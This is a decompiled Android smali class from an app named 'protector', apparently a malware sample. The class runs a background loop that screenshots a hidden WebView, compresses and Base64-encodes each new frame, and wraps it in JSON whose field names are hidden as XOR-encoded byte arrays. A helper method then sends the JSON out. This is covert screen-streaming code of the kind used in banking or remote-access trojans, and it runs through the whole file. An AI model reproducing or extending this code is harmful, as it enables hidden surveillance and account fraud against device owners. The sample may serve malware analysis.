.class Lcom/icontrol/protector/HiddenBrowser$g;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/HiddenBrowser;->a(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Landroid/content/Context;

.field final synthetic f:Lcom/icontrol/protector/HiddenBrowser;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/HiddenBrowser;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$g;->f:Lcom/icontrol/protector/HiddenBrowser;

    iput-object p2, p0, Lcom/icontrol/protector/HiddenBrowser$g;->e:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    invoke-static {v0, v1}, Lcom/icontrol/protector/HiddenBrowser;->f(J)J

    const-wide/16 v0, 0x64

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    const/16 v0, 0x8

    :try_start_1
    iget-object v1, p0, Lcom/icontrol/protector/HiddenBrowser$g;->f:Lcom/icontrol/protector/HiddenBrowser;

    invoke-static {v1}, Lcom/icontrol/protector/HiddenBrowser;->g(Lcom/icontrol/protector/HiddenBrowser;)Z

    move-result v1

    if-nez v1, :cond_1

    goto/16 :goto_0

    :cond_1
    iget-object v1, p0, Lcom/icontrol/protector/HiddenBrowser$g;->f:Lcom/icontrol/protector/HiddenBrowser;

    invoke-static {v1}, Lcom/icontrol/protector/HiddenBrowser;->d(Lcom/icontrol/protector/HiddenBrowser;)Landroid/webkit/WebView;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/icontrol/protector/HiddenBrowser;->m(Landroid/webkit/WebView;)Landroid/graphics/Bitmap;

    move-result-object v1

    const/16 v2, 0x15e

    const/16 v3, 0x28a

    const/4 v4, 0x1

    invoke-static {v1, v2, v3, v4}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v1

    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->WEBP:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v5, 0x46

    invoke-virtual {v1, v3, v5, v2}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v1, v2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v1

    iget-object v3, p0, Lcom/icontrol/protector/HiddenBrowser$g;->f:Lcom/icontrol/protector/HiddenBrowser;

    iget-object v3, v3, Lcom/icontrol/protector/HiddenBrowser;->f:Ljava/lang/String;

    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_2

    iget-object v3, p0, Lcom/icontrol/protector/HiddenBrowser$g;->f:Lcom/icontrol/protector/HiddenBrowser;

    iput-object v1, v3, Lcom/icontrol/protector/HiddenBrowser;->f:Ljava/lang/String;

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    const/4 v5, 0x4

    new-array v5, v5, [B

    fill-array-data v5, :array_0

    new-array v6, v0, [B

    fill-array-data v6, :array_1

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x6

    new-array v6, v6, [B

    fill-array-data v6, :array_2

    new-array v7, v0, [B

    fill-array-data v7, :array_3

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v5, 0x3

    new-array v6, v5, [B

    fill-array-data v6, :array_4

    new-array v7, v0, [B

    fill-array-data v7, :array_5

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v1, v5, [B

    fill-array-data v1, :array_6

    new-array v5, v0, [B

    fill-array-data v5, :array_7

    invoke-static {v1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v4, v4, [B

    const/16 v5, -0x61

    aput-byte v5, v4, v2

    new-array v2, v0, [B

    fill-array-data v2, :array_8

    invoke-static {v4, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/icontrol/protector/HiddenBrowser$g;->f:Lcom/icontrol/protector/HiddenBrowser;

    iget-object v3, p0, Lcom/icontrol/protector/HiddenBrowser$g;->e:Landroid/content/Context;

    invoke-static {v2, v3, v1}, Lcom/icontrol/protector/HiddenBrowser;->i(Lcom/icontrol/protector/HiddenBrowser;Landroid/content/Context;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :catch_1
    move-exception v1

    const/16 v2, 0xa

    new-array v2, v2, [B

    fill-array-data v2, :array_9

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    invoke-static {v2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :cond_2
    :goto_0
    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser$g;->e:Landroid/content/Context;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->U:Ljava/lang/String;

    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :array_0
    .array-data 1
        -0x6et
        0x66t
        -0x3ct
        -0x1ct
    .end array-data

    :array_1
    .array-data 1
        -0x1at
        0x1ft
        -0x4ct
        -0x7ft
        0x5ft
        0x19t
        0x3et
        -0x4bt
    .end array-data

    :array_2
    .array-data 1
        -0x33t
        0x6t
        0x36t
        -0x36t
        -0x4t
        0x32t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x46t
        0x64t
        0x54t
        -0x48t
        -0x6dt
        0x45t
        -0x6ft
        -0x20t
    .end array-data

    :array_4
    .array-data 1
        0x3ct
        0x4dt
        -0x59t
    .end array-data

    :array_5
    .array-data 1
        0x55t
        0x20t
        -0x40t
        0x11t
        -0x54t
        0x78t
        0x3t
        -0x59t
    .end array-data

    :array_6
    .array-data 1
        0x5t
        0xbt
        -0x63t
    .end array-data

    :array_7
    .array-data 1
        0x66t
        0x7et
        -0x19t
        0x5et
        0x49t
        0x70t
        0x48t
        -0x5at
    .end array-data

    :array_8
    .array-data 1
        -0x9t
        0x2at
        0x36t
        0x2et
        0xct
        -0x13t
        0x39t
        -0x16t
    .end array-data

    :array_9
    .array-data 1
        0x12t
        0x1ft
        0x3bt
        -0x15t
        0x59t
        0x46t
        0x5bt
        -0x51t
        0x36t
        0x1ft
    .end array-data

    nop

    :array_a
    .array-data 1
        0x40t
        0x7at
        0x56t
        -0x7ct
        0x2dt
        0x23t
        0x17t
        -0x3at
    .end array-data
.end method
